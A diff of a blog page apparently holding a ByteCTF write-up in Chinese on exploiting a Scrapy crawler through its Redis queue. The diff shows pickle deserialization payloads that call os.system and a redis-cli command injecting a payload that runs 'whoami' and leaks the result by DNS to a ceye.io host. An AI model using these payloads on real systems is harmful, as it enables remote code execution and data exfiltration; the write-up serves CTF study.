@@ -13,7 +13,7 @@
      <div class="sidebar animated fadeInDown">
    <div class="logo-title">
     <div class="title">
-     <img src="https://ablacknut.github.io/images/avatar.png?v=1605452029335" style="width:127px;" />
+     <img src="https://ablacknut.github.io/images/avatar.png?v=1605452428582" style="width:127px;" />
 
      <h3 title=""><a href="/">blacknut</a></h3>
 
@@ -296,7 +296,7 @@ BYTECTF<br>
 <h2 id="itemitemspy">item：items.py</h2>
 <figure data-type="image" tabindex="2"><img src="https://ablacknut.github.io/post-images/1605445885233.jpg" alt="" loading="lazy"></figure>
 <ul>
-<li>BytectfItem就是这个爬虫想要获取的数据，12 13 141行定义了三个字段。</li>
+<li>BytectfItem就是这个爬虫想要获取的数据，12 13 14行定义了三个字段。</li>
 <li>这个类实例化后，就可以像python的字典一样使用，具体可以看spider文件内</li>
 </ul>
 <h2 id="spider-spidersbytepy">spider: spiders/byte.py</h2>
@@ -365,7 +365,7 @@ p_str = pickle.dumps(data)
 </code></pre>
 </li>
 <li>可以看到b是一个数组，我们来解释一下这个字符串。首先记住pickle自己维护了一个栈区，<code>（</code>在栈里面放了一个<code>mark</code>符号；<code>Vtest\n</code>在栈里面放了一个<code>'test'</code>字符串；<code>t</code>就是弹出了栈中直到<code>mark</code>符号；将<code>mark</code>符号前的内容放入一个元组并且又放回了栈内，那就是将<code>test</code>字符串放入了一个元组；<code>.</code>停止符，结束了反序列化操作。最后栈顶就有了一个<code>('test',)</code>。最终反序列化内容就是一个元组<code>('test',)</code>。</li>
-<li>这样我们就可以在构造一个可以执行命令的payload<pre><code class="language-python">&gt;&gt;&gt; a = b'cos\nsystem\n(Vping \ntR(Vtest\nt.' 
+<li>这样我们就可以在构造一个可以执行命令的payload<pre><code class="language-python">&gt;&gt;&gt; a = b'cos\nsystem\n(Vwhoami\ntR(Vtest\nt.' 
  &gt;&gt;&gt; b = pickle.loads(a)                        
  26111                                          
  &gt;&gt;&gt; b                                          
@@ -393,13 +393,8 @@ p_str = pickle.dumps(data)
 </ol>
 <h2 id="佛系复现">佛系复现</h2>
 <ul>
-<li>因为没有web界面了，也没办法利用ssrf，就不用构造gopher+ssrf的payload了(这个应该不难)，那我们就手动进入redis容器，执行：</li>
-</ul>
-<pre><code class="language-shell">redis-cli
-127.0.0.1:6379&gt; zadd byte:requests 0 &quot;cos\nsystem\n(Vping `whoami`.ip.port.hembie.ceye.io\ntR.&quot;
-(integer) 1
-</code></pre>
-<ul>
+<li>因为没有web界面了，也没办法利用ssrf，就不用构造gopher+ssrf的payload了(这个应该不难)，那我们就手动进入redis容器，执行：<br>
+<code>shell redis-cli 127.0.0.1:6379&gt; zadd byte:requests 0 &quot;cos\nsystem\n(Vping `whoami`.ip.port.hembie.ceye.io\ntR.&quot; (integer) 1</code></li>
 <li>出来我们查看以下scrapy容器日志，<code>docker log 容器ID</code>：<br>
 <img src="https://ablacknut.github.io/post-images/1605451874569.jpg" alt="" loading="lazy"><br>
 再看下ceye：<img src="https://ablacknut.github.io/post-images/1605451907620.jpg" alt="" loading="lazy"></li>
